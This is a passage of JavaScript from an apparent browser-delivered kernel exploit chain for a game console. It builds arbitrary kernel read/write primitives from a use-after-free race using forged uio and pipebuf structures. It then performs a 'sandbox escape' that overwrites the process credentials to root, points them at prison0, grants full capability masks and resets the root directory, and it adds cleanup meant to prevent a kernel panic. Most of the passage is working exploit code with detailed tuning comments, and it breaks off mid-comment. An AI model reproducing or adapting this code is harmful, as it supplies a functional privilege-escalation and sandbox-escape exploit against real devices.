                if (tripletsUsable() && tripletsAgree(tag)) return true;
                sc(SYS.sched_yield);
            }
            mark("REFIND-UNVALIDATED", "tag=" + tag
                + " triplets=" + triplets.join(","));
            return false;
            })();
        }
        refindTriplets = async function (itasks) {
            await releaseIov(itasks);
            /*
            refindPair is async (findTriplet yields) -- a bare call hands back
            a PROMISE, which is always truthy, so this used to report success
            unconditionally and every kread/kwrite kept racing on dead
            triplets. Await it.
            */
            if (await refindPair("RE")) return true;
            mark("TRIPLETS-LOST", "triplets=" + triplets.join(","));
            return false;
        }

        unwind = async function (utasks, itasks, why, wakeUio, size, drainReads) {
            mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
            try {
                if (wakeUio && utasks && utasks[0]) {

                    /*
                    THE ONLY UNBOUNDED BLOCK IN THIS FILE, now bounded.
                    uioSs[1] (the write end) is O_NONBLOCK from creation, so the
                    pushes below cannot sleep. The READ end is deliberately still
                    blocking, and sc() is a synchronous syscall on the main JS thread,
                    so one read past the available bytes would park the WebProcess
                    forever -- which is why the drain count is computed rather than
                    guessed at.

                    This is only reached when landUio EXHAUSTED its rounds,
                    and every round ends with await Promise.all(tasks), so no
                    racer is parked and there is nothing to wake. What is left
                    is exactly the re-prefill: `size` bytes on the read side
                    (landUio re-primes at its round tail) and NOTHING on the
                    write side (forWrite skips that prime, and its racers are
                    readv()-ers). So: one read, or none. Never N+1.
                    The old code asked for (N+1)*8 and hung just as hard --
                    it only ever survived because this path is rare.
                    */
                    /*
                    NON-BLOCKING DRAIN -- see landUio. A blocking read here
                    parks the main thread in the kernel on the RECOVERY path,
                    which is the worst place for it: no JS timeout can fire
                    and the finally that restores thread affinity never runs.
                    Read until EAGAIN and stop; the exact count does not matter.
                    */
                    const dsz = size || 8;
                    sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK);
                    for (let k = 0; k < (drainReads || 0); ++k)
                        if (sc(SYS.read, uioSs[0], scratch, dsz).i32 < 0) break;
                    sc(SYS.fcntl, uioSs[0], F_SETFL, 0);
                    /* Bounded: the racers are fireW(..., 0) with no timeout, so
                       an unbounded join here wedges the page on the very path
                       that is supposed to RECOVER from a failure. */
                    await boundedJoin(utasks, JOIN_MS, "unwind-uio");
                }
            } catch (e) { mark("UNWIND-UIO-THREW", e.message); }
            try {
                if (itasks && itasks[0]) await releaseIov(itasks);
            } catch (e) { mark("UNWIND-IOV-THREW", e.message); }
            restoreRefcntIov();
            /* Same as above: refindPair is async, its Promise is truthy. */
            const ok = await refindPair("UW");
            mark("KREAD-UNWOUND", "triplets=" + triplets.join(",")
                + " usable=" + ok);
            return ok;
        }

        /*
        `pairs` (optional) = [{addr,size},...] gathered into ONE forged uio.
        `size` must be the sum. iovAb is 0x170 = [uio 0x30][20 iovec slots],
        uio_iovcnt is already NUM_UIO_IOV (0x14), and fakeUio zero-fills, so
        slots 1..19 are in-bounds and inert unless populated here.
        ITEM 2. Refuse to spend a slow op on an address that cannot be a
        kernel pointer. Without this, a kread that returned all zeros gave
        int64(0,0) -- which is TRUTHY -- so the walk carried on and issued a
        read at ~0x270 through a UIO_SYSSPACE uio inside writev: a near-NULL
        kernel dereference. poops.js:4800-4807 gates the same way.
        */
        // module/addr.js: isKernelPtrAligned (kaddrOk).
        const kaddrOk = isKernelPtrAligned;

        kreadSlow = async function (addr, size, pairs) {
            if (kreadPoisoned) { mark("KREAD-REFUSED", "reason=poisoned"); return null; }
            if (pairs) {
                for (const q of pairs) if (!kaddrOk(q.addr)) {
                    mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr);
                    return null;
                }
            } else if (!kaddrOk(addr)) {
                mark("KREAD-REFUSED", "bad-addr=" + addr);
                return null;
            }
            if (!tripletsUsable()) {
                mark("KREAD-REFUSED", "triplets="
                    + triplets.join(",")); return null;
            }
            if (pairs && pairs.length > NUM_UIO_IOV) {
                mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV);
                return null;
            }
            mark("KREAD-BEGIN", "addr=" + (pairs
                ? pairs.map(p2 => "" + p2.addr).join("+") : addr) + " size=" + size);
            const bufs = uioWorkers.map(function () {
                const ab = new ArrayBuffer(size); keepAlive.push(ab);

                /*
                ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
                from a real read of a zero qword. A fresh buffer is all
                zeros, which used to sail through the hit test below and
                return int64(0,0) as if it were kernel data.
                */
                new Uint8Array(ab).fill(0x41);
                return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
            });
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            /*
            uioSs[1] is O_NONBLOCK from creation (stagePrimitive). This prime
            must not assume it landed: if a previous op left the buffer full,
            it returns EAGAIN immediately instead of sleeping, and landUio
            re-fills on its own round tail. Check the result rather than
            treating a full buffer as fatal.
            */
            const primed = sc(SYS.write, uioSs[1], scratch, size).i32;
            if (primed < 0)
                trace("UIO-PRIME-EAGAIN", "size=" + size
                    + " -- buffer was full; landUio will re-fill");
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, false, utasks);
            if (!uioIov) {
                /*
                landUio just spent its WHOLE budget (30 s / 10 000 rounds) and
                did not land. That is not a transient miss a retry can fix --
                the chunk is not coming back through this path -- so poison
                here too. Without this, kread8/kreadN/kreadPairs each burn
                KREAD_TRIES x 30 s more of spraying before anything gives up,
                which is the endless UIO-LAND-ROUND stream.
                */
                kreadPoisoned = true;
                mark("UIO-LAND-EXHAUSTED", "size=" + size + " -- poisoning kreads");
                await unwind(utasks, null, "no-uio", true, size, 1);
                return null;
            }
            trace("UIO-LANDED", "uio_iov=" + uioIov);
            /*
            Populate the IOVEC ARRAY the kernel will import, then point the uio
            header at it. Previously these writes went into iovDv at 0x30 --
            i.e. INSIDE the uio struct, which sys_writev's uio_setup never
            reads. They now go into uioIovAb, which uio_iov references.
            */
            if (pairs) {
                new Uint8Array(uioIovAb).fill(0);
                for (let i = 0; i < pairs.length; ++i) {
                    put(uioIovDv, 0x00 + IOVEC_SIZE * i, pairs[i].addr);
                    put(uioIovDv, 0x08 + IOVEC_SIZE * i, pairs[i].size);
                }
            } else {
                setUioIov(addr, size);
            }
            fakeUio(uioIov, size, UIO_WRITE);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) {
                kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return null;
            }
            trace("KREAD-WAKE", "src=" + addr);

            /*
            NON-BLOCKING DRAIN. This used to issue 1 + bufs.length BLOCKING
            reads of `size` bytes each -- 5 reads for a single `size`-byte
            chunk -- so it parked the main thread on the 2nd read and never
            came back. That is the KREAD-BEGIN indefinite hang, confirmed by
            the log stopping at KREAD-BEGIN with no KREAD-DRAINED line.

            Read until EAGAIN instead. The sentinel fill in each buffer makes
            an unread buffer distinguishable from a read of zero bytes, so
            "how many actually arrived" is answered by the CONTENT, not by a
            guessed count. First buffer that is no longer 0x41414141 wins.
            */
            sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK);
            let got = null, drained = 0;
            for (const b of bufs) {
                if (sc(SYS.read, uioSs[0], b.addr, size).i32 < 0) break;
                drained++;
                if (!got
                    && !(b.dv.getUint32(0, true) === 0x41414141
                        && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
            }
            sc(SYS.fcntl, uioSs[0], F_SETFL, 0);
            trace("KREAD-DRAINED", "bufs=" + drained + "/" + bufs.length
                + " hit=" + (got ? 1 : 0));
            /* Bounded: a fully-parked batch must not hang the stage. */
            await boundedJoin(utasks, JOIN_MS, "kread-join");
            trace("KREAD-UIO-JOINED", "");
            restoreRefcntIov();
            await refindTriplets(itasks);
            return got;
        }

        kwriteSlow = async function (dst, srcAddr, size) {
            if (kreadPoisoned) { mark("KWRITE-REFUSED", "reason=poisoned"); return false; }
            if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
            if (!tripletsUsable()) {
                mark("KWRITE-REFUSED", "triplets="
                    + triplets.join(",")); return false;
            }
            mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
            lenDv.setUint32(0, size, true);
            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
            put(uioIovDv, 8, size);
            const utasks = new Array(uioWorkers.length);
            const uioIov = await landUio(size, true, utasks);
            if (!uioIov) {
                /* Same as kreadSlow: a full-budget miss poisons, not retries. */
                kreadPoisoned = true;
                mark("UIO-LAND-EXHAUSTED", "size=" + size + " -- poisoning kwrites");
                await unwind(utasks, null, "no-uio", true, size, 0);
                return false;
            }
            /*
            uioSs[1] is O_NONBLOCK from creation, so the wake write just below
            cannot sleep even if the uio racers fired by landUio are still
            parked in readv() on uioSs[0] with the send buffer full.
            */
            /* iovec array first (what the kernel imports), then the header. */
            setUioIov(dst, size);
            fakeUio(uioIov, size, UIO_READ);
            const itasks = new Array(iovWorkers.length);
            const ok = await landFakeUio(itasks);
            if (!ok) {
                kreadPoisoned = true;
                await unwind(utasks, itasks, "no-fake-uio", false, size);
                return false;
            }
            for (let k = 0; k < uioWorkers.length; ++k)
                sc(SYS.write, uioSs[1], srcAddr, size);
            /* Bounded: the join after landing is where the "make_karw..."
               stall after KWRITE-BEGIN froze -- a parked racer must not wait
               forever. JOIN-TIMEOUT lets kwrite8n retry or poison. */
            await boundedJoin(utasks, JOIN_MS, "kwrite-join");
            restoreRefcntIov();
            await refindTriplets(itasks);
            return true;
        };
}

/*
================================================================================
STAGE 8: stageMakeKarw -- the pipe-carrier kernel R/W, jailbreak, patch, payload
================================================================================

One stage, because every part of it shares kv (the pipe-carrier read/write), and
that carrier only exists once the forged pipebuf write has committed. The order
below is load-bearing: jailbreak BEFORE the teardown, repair (null the triplet
ip6po_rthdr, drain the file zone) BEFORE exiting, kpatch AFTER the repair, and
the payload last -- all of it inside one gate so a throw cannot skip the repair
and leave the console dirty.

Sets kv on success; the orchestrator reports kv != null as "kernel R/W achieved".
*/
async function stageMakeKarw() {
        /*
        R1. This read proves nothing the pipe primitive does not prove better,
        and it is slow op #1 of 7 -- one full UAF re-roll at ~3.1% death for a
        check that is repeated at :kernelview-reads-kernel-elf-header on the
        FAST primitive, before the first kernel write. poops.js:8672 runs its
        ELF proof on kread64Fast for exactly this reason, and poops.js:6063
        records deleting the equivalent slow read. `kernelBase` is still
        required below, so the gate on it stays.
        */
        R1_ON = params.get("r1") !== "0";
        if (!R1_ON && kernelBase && triplets) {
            state("kread_slow...", "warn");
            const got = await kreadSlow(kernelBase, 0x20);
            if (got) {
                const b = [];
                for (let i = 0; i < 16; ++i) b.push(got.getUint8(i));
                mark("KREAD", "kernel_base -> "
                    + b.map(v => v.toString(16).padStart(2, "0")).join(" "));
                check("kread_slow-reads-kernel-elf-header",
                    got.getUint32(0, true) === 0x464c457f,
                    "e_type=" + got.getUint16(0x10, true)
                    + " e_machine=" + hx(got.getUint16(0x12, true)));
            } else check("kread_slow-returned-data", false, "");
        }

        if (kernelBase && triplets && kqFdp) {
            state("make_karw...", "warn");
            mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));

            const KREAD_TRIES = params.has("kreadtries")
                ? parseInt(params.get("kreadtries"), 10) : 4;
            async function kread8(a) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
                    const dv = await kreadSlow(a, 8);
                    if (dv) return new int64(dv.getUint32(0, true),
                        dv.getUint32(4, true));
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            async function kwrite8n(dst, srcAddr, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
                    if (await kwriteSlow(dst, srcAddr, n)) return true;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return false;
            }


            // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
            const qw = (dv, o) => new int64(dv.getUint32(o, true),
                dv.getUint32(o + 4, true));
            async function kreadN(a, n) {
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "addr=" + a + " n=" + n
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(a, n);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }

            /*
            R4. One window, two non-adjacent addresses, via extra iovec slots
            in the forged uio. poops.js:4909-4930 buildUioPairs / :4947-5010.
            */
            async function kreadPairs(pairs) {
                let total = 0;
                for (const p2 of pairs) total += p2.size;
                for (let t = 0; t < KREAD_TRIES; ++t) {
                    if (t) mark("KREAD-RETRY", "pairs=" + pairs.length
                        + " try=" + (t + 1));
                    const dv = await kreadSlow(null, total, pairs);
                    if (dv) return dv;
                    if (kreadPoisoned || !tripletsUsable()) break;
                }
                return null;
            }
            const R3_ON = params.get("r3") !== "0";
            const R4_ON = params.get("r4") !== "0";

            const fdtOfiles = await kread8(kqFdp);
            mark("FDT-OFILES", "" + fdtOfiles);

            /*
            R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
            span, so one 0x20 read replaces two windows. pipe() at :387/:389
            are back-to-back with no intervening fd allocation, so the two
            low fds are always 2 apart -- 44/44 in the log. Verified, not
            assumed, and it falls back if the console ever disagrees.
            */
            let mFp = null, sFp = null;
            const fdDelta = slavePipe[0] - masterPipe[0];
            const spanOk = R3_ON && fdtOfiles && fdDelta > 0
                && (fdDelta + 1) * FILEDESCENT_SIZE <= 0x20;
            if (spanOk) {
                const span = await kreadN(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE), 0x20);
                if (span) {
                    mFp = qw(span, 0);
                    sFp = qw(span, fdDelta * FILEDESCENT_SIZE);
                } else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
            }
            if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
                if (spanOk) mark("PIPE-FP-FALLBACK", "two single reads");
                mFp = await kread8(
                    fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                sFp = await kread8(
                    fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
            }
            mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?")
                + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));

            /*
            R4. f_data of the two struct files: unrelated addresses, so a
            contiguous read cannot help -- this needs the scatter.
            */
            let mData = null, sData = null;
            if (R4_ON && mFp && sFp) {
                const both = await kreadPairs([{ addr: mFp, size: 8 },
                { addr: sFp, size: 8 }]);
                if (both) { mData = qw(both, 0); sData = qw(both, 8); }
                else mark("PIPE-FDATA-SCATTER-MISS", "");
            }
            if (!mData && !kreadPoisoned && tripletsUsable()) {
                if (R4_ON && mFp && sFp) mark("PIPE-FDATA-FALLBACK", "two reads");
                mData = mFp ? await kread8(mFp) : null;
                sData = sFp ? await kread8(sFp) : null;
            }
            mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
            const kptr = isKernelPtr;   // module/addr.js

            /*
            R8. Two distinct struct files cannot share f_data. Equal values
            mean the alias was misidentified, and aiming a pipebuf at itself
            is not something that fails cleanly. POOPS.LUA:1068 aborts here.
            */
            if (kptr(mData) && kptr(sData)
                && mData.low === sData.low && mData.hi === sData.hi) {
                check("pipe-fdata-distinct", false, "both=" + mData);
                mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
                mData = null;
            }
            if (!check("ofiles-walk-reached-pipes",
                kptr(fdtOfiles) && kptr(mFp) && kptr(sFp)
                && kptr(mData) && kptr(sData), "")) {
                mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
            } else {

                const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                keepAlive.push(pbAb);
                const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
                new Uint8Array(pbAb).fill(0);
                pbDv.setUint32(0x0c, PIPE_PAGE, true);
                put(pbDv, 0x10, sData);
                mark("PIPEBUF-AIM", "at=" + mData + " size=0x"
                    + PIPE_PAGE.toString(16) + " buffer=" + sData);
                const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                check("pipebuf-written-master-struct-pipe", wrote, "");

                if (wrote) {
                    for (const fd of [masterPipe[0], masterPipe[1],
                    slavePipe[0], slavePipe[1]])
                        sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
                    const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                    const kvViewAb = new ArrayBuffer(0x40);
                    keepAlive.push(kvBufAb, kvViewAb);
                    const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
                    const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
                    new Uint8Array(kvBufAb).fill(0);
                    kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
                    kv = {
                        flush: function () {
                            sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                            sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
                        },
                        kread: function (dst, src, n) {
                            put(kvBufDv, 0x10, src);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.read, slavePipe[0], dst, n).i32;
                        },
                        kwrite: function (dst, src, n) {
                            put(kvBufDv, 0x10, dst);
                            kvBufDv.setUint32(0, n >>> 0, true);
                            this.flush();
                            return sc(SYS.write, slavePipe[1], src, n).i32;
                        },
                        read8: function (a) {
                            new Uint8Array(kvViewAb).fill(0);
                            this.kread(kvViewAddr, a, 8);
                            return new int64(kvViewDv.getUint32(0, true),
                                kvViewDv.getUint32(4, true));
                        },
                    };
                    mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);

                    new Uint8Array(kvViewAb).fill(0);
                    kv.kread(kvViewAddr, kernelBase, 0x10);
                    const hdr = [];
                    for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
                    mark("KV-READ", "kernel_base -> "
                        + hdr.map(v => v.toString(16).padStart(2, "0")).join(" "));
                    const kvElfOk = check("kernelview-reads-kernel-elf-header",
                        kvViewDv.getUint32(0, true) === 0x464c457f, "");

                    const fpM2 = kv.read8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
                    const fpS2 = kv.read8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
                    const same = sameI64;   // module/addr.js
                    mark("KV-FGET", "master=" + fpM2 + " kread=" + mFp
                        + " slave=" + fpS2 + " kread=" + sFp);
                    const kvAgree = check("primitives-agree-pipes-struct-file",
                        same(fpM2, mFp) && same(fpS2, sFp), "");
                    if (!kvElfOk || !kvAgree) {

                        /*
                        REPORT ONLY. Do NOT null kv and do NOT skip what
                        follows. By this point the pipebuf forge has already
                        been committed, and the code below -- nulling the
                        triplets' ip6po_rthdr and removing the aliased struct
                        file -- is exactly what lets the process exit without
                        panicking the kernel. Gating it on a failed view
                        turns a run that would have finished dirty-but-alive
                        into a guaranteed panic at exit. Four independent
                        reviewers caught this; it was my mistake.
                        */
                        mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0)
                            + " agree=" + (kvAgree ? 1 : 0)
                            + " -- repair still runs, later stages self-gate");
                    }

                    const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                    const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);

                    /*
                    dump scratch: kvwAb is only 0x10, and the pipebuf read
                    needs 0x18. Separate buffers so the dump can never
                    overflow the one the kview accessors use.
                    */
                    const dmpAb = new ArrayBuffer(0x20); keepAlive.push(dmpAb);
                    const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
                    const dmpU8 = new Uint8Array(dmpAb);
                    const scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
                    keepAlive.push(scanAbDump);
                    const scanAddrDump = bufAddr(scanAbDump);
                    const scanDvDump = new DataView(scanAbDump);
                    function kview(base) {
                        return {
                            getBInt: function (o) {
                                return kv.read8(base.add32(o));
                            },
                            setBInt: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                put(kvwDv, 0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 8);
                            },
                            getInt32: function (o) {
                                new Uint8Array(kvwAb).fill(0);
                                kv.kread(kvwAddr, base.add32(o), 4);
                                return kvwDv.getInt32(0, true);
                            },
                            setInt32: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setInt32(0, v, true);
                                kv.kwrite(base.add32(o), kvwAddr, 4);
                            },
                            setUint8: function (o, v) {
                                new Uint8Array(kvwAb).fill(0);
                                kvwDv.setUint8(0, v);
                                kv.kwrite(base.add32(o), kvwAddr, 1);
                            },
                        };
                    }
                    const kptr2 = isKernelPtr;   // module/addr.js
                    const fget = fd => kv.read8(
                        fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                    function fput(fd, v) {
                        new Uint8Array(kvwAb).fill(0);
                        put(kvwDv, 0, v);
                        kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8);
                    }

                    /*
                    io adapter for post-exploit.js (module/post-exploit.js).
                    That module drives sysent through this four-method shape
                    so it never has to import either chain's kernel R/W. It is
                    the ONLY thing netctrl hands it: everything else -- the
                    fixed 0x4000 RWX size, the try/finally restore guard, the
                    absence of ?patch=0 -- stays in this file as policy.
                    */
                    const io = {
                        kread32: function (a) { return kview(a).getInt32(0) >>> 0; },
                        kread64: function (a) { return kview(a).getBInt(0); },
                        kwrite32: function (a, v) { kview(a).setInt32(0, v); },
                        kwrite64: function (a, v) { kview(a).setBInt(0, v); },
                    };

                    function fhold(fp) {
                        const before = kview(fp).getInt32(0x28);
                        if (before <= 0 || before > 0xffff) return { before, after: before };
                        let after = before;
                        for (let bump = 1; bump <= 4; ++bump) {
                            kview(fp).setInt32(0x28, before + bump);
                            after = kview(fp).getInt32(0x28);
                            if (after > before && after >= 2) break;
                        }
                        return { before, after };
                    }
                    {
                        const held = [];
                        let allOk = true;
                        for (const fd of [masterPipe[0], masterPipe[1],
                        slavePipe[0], slavePipe[1]]) {
                            const fp = fget(fd);
                            if (!kptr2(fp)) { allOk = false; held.push(fd + ":badfp"); continue; }
                            const r = fhold(fp);
                            if (!(r.after > r.before)) allOk = false;
                            held.push(fd + ":" + r.before + "->" + r.after);
                        }
                        mark("PIPE-REFCNT", held.join(" "));
                        check("four-karw-pipe-files-hold",
                            allOk, "");
                    }

                    /*
                    ITEM 1. Jailbreak BEFORE the teardown. The funnel was
                    KERNELVIEW 44 -> CURPROC 38: six runs had working
                    kernel R/W and died in cleanup without ever trying.
                    Everything below needs only kv, fdtOfiles and sc, all
                    live from here. poops.js:7273 orders it the same way.

                    WRAPPED, and it has to be: running before the cleanup
                    means a throw in here would skip the socket close and
                    the alias repair and leave the console dirty. Running
                    last, it never could.
                    */
                    let jailbreakThrew = null;

                    /*
                    Declared OUT here: the kernel patcher and the
                    payload stage read both, and a let inside the try
                    below would be block-scoped away from them --
                    a runtime ReferenceError node --check cannot see.
                    */
                    let jailbroken = false, curproc = null;
                    try {
                        const FIOSETOWN = 0x8004667c;
                        const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                        const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
                        state("sandbox escape...", "warn");
                        {
                            if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                const escPipe = [argDv.getInt32(0, true),
                                argDv.getInt32(4, true)];
                                lenDv.setUint32(0, pid, true);
                                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                                const escFp = fget(escPipe[0]);
                                const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                                const sigio = kptr2(escData)
                                    ? kv.read8(escData.add32(0xd0)) : null;
                                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                                sc(SYS.close, escPipe[1]);
                                sc(SYS.close, escPipe[0]);
                            }
                            mark("CURPROC", "" + (curproc || "null"));
                            check("curproc-resolved-through-pipe-sigio",
                                kptr2(curproc), "" + (curproc || "null"));
                        }
                        if (kptr2(curproc)) {

                            async function pfind(target) {
                                let q = kv.read8(curproc);
                                for (let n = 0; n < 4096; ++n) {
                                    if (!kptr2(q)) return null;
                                    if (kview(q).getInt32(P_PID) === target) return q;
                                    q = kv.read8(q.add32(P_LIST_NEXT));
                                }
                                return null;
                            }
                            const kProc = await pfind(0);
                            const procFd = kv.read8(curproc.add32(P_FD));
                            const ucred = kv.read8(curproc.add32(P_UCRED));
                            mark("JAILBREAK-SOURCES", "kproc=" + (kProc || "null")
                                + " p_fd=" + procFd + " p_ucred=" + ucred);
                            const prison0 = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON))
                                : null;
                            const rootVnode = kptr2(kProc)
                                ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR))
                                : null;
                            const srcOk = kptr2(procFd) && kptr2(ucred)
                                && kptr2(prison0) && kptr2(rootVnode);
                            mark("JAILBREAK-KSRC", "prison0=" + (prison0 || "null")
                                + " rootvnode=" + (rootVnode || "null"));
                            if (check("jailbreak-source-kernel-pointer",
                                srcOk, srcOk ? "" : "refusing to write")) {
                                kview(ucred).setInt32(CR_UID, 0);
                                kview(ucred).setInt32(CR_RUID, 0);
                                kview(ucred).setInt32(CR_SVUID, 0);
                                kview(ucred).setInt32(CR_NGROUPS, 1);
                                kview(ucred).setInt32(CR_RGID, 0);
                                kview(ucred).setBInt(CR_PRISON, prison0);
                                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                                kview(procFd).setBInt(FD_RDIR, rootVnode);
                                kview(procFd).setBInt(FD_JDIR, rootVnode);
                                const uidNow = sc(SYS.getuid).i32;
                                jailbroken = uidNow === 0;
                                mark("JAILBROKEN", "uid=" + uidNow
                                    + " prison0=" + kview(ucred).getBInt(CR_PRISON)
                                    + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
                                check("kernel-reports-root",
                                    jailbroken, "getuid=" + uidNow);
                            }
                        }
                    } catch (e) {
                        jailbreakThrew = e && e.message ? e.message : "" + e;
                        mark("JAILBREAK-THREW", jailbreakThrew
                            + " -- continuing to cleanup");
                    }

                    /*
                    Addresses captured during the repair so the end-of-run
                    dump can re-read them once the sockets are closed.
                    */
                    const dumpOpts = [];
                    function removeRthdrFromSocket(fd) {
                        const fp = fget(fd);
                        if (!kptr2(fp)) return "badfp";
                        const fData = kv.read8(fp);
                        if (!kptr2(fData)) return "badfdata";
                        const soPcb = kv.read8(fData.add32(0x18));
                        if (!kptr2(soPcb)) return "badpcb";
                        const opts = kv.read8(soPcb.add32(0x118));
                        if (kptr2(opts)) dumpOpts.push({ fd: fd, opts: opts });
                        if (!kptr2(opts)) return "noopts";

                        /*
                        ITEM 4. Read it, write it, READ IT BACK. This is the
                        single write that decides whether the process can exit
                        without panicking, and until now nothing anywhere in
                        the chain has ever confirmed that a kv write actually
                        lands -- the check below reported "nulled" purely
                        because the four reads above looked pointer-shaped.
                        poops.js:7123-7128 reads back the same way.
                        */
                        const was = kview(opts).getBInt(0x68);
                        kview(opts).setBInt(0x68, new int64(0, 0));
                        const now = kview(opts).getBInt(0x68);
                        if (!now || (now.low >>> 0) !== 0 || (now.hi >>> 0) !== 0) {
                            mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts
                                + " was=" + was + " still=" + now);
                            return "writefail";
                        }
                        return was && ((was.low >>> 0) || (was.hi >>> 0))
                            ? "nulled" : "already0";
                    }
                    {
                        const res = triplets.map(fd => fd + ":" + removeRthdrFromSocket(fd));
                        mark("TRIPLET-RTHDR", res.join(" "));

                        /*
                        "already0" is a success: the field was already clear,
                        so there is nothing to repair. Only a failed WRITE or
                        a bad walk is a failure -- and unlike before, this now
                        reflects a verified read-back rather than the shape of
                        the pointers we walked to get here.
                        */
                        check("triplet-ip6po_rthdr-nulled",
                            res.every(r => r.endsWith("nulled")
                                || r.endsWith("already0")),
                            res.join(" "));
                    }

                    /*
                    ITEM 6(c). The half that makes the retry safe. Every socket
                    burned during a failed attempt still has an rthdr pointing
                    at a freed ucred; closing it would free that chunk again.
                    Now that kernel R/W exists, null the pointer -- verified by
                    read-back -- and only then let it out of the burn list.
                    Anything that will not repair STAYS burned and stays open.
                    */
                    if (burned.size) {
                        const bres = [], cleared = [];
                        for (const fd of burned) {
                            const r = removeRthdrFromSocket(fd);
                            bres.push(fd + ":" + r);
                            if (r === "nulled" || r === "already0") cleared.push(fd);
                        }
                        for (const fd of cleared) burned.delete(fd);
                        mark("BURNED-REPAIRED", bres.join(" ")
                            + "  still_burned=" + burned.size);
                        check("burned-sockets-repaired", burned.size === 0,
                            burned.size ? [...burned].join(",") : "");
                        if (burned.size) rebootRequired = true;
                    }

                    state("remove_uaf_file...", "warn");
                    const uafFp = fget(uafSock);
                    uafFpSaved = uafFp;
                    mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
                    if (kptr2(uafFp)) {

                        const r = fhold(uafFp);

                        /*
                        THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
                        2048 x fget(), and every fget minted TWO int64 -- and
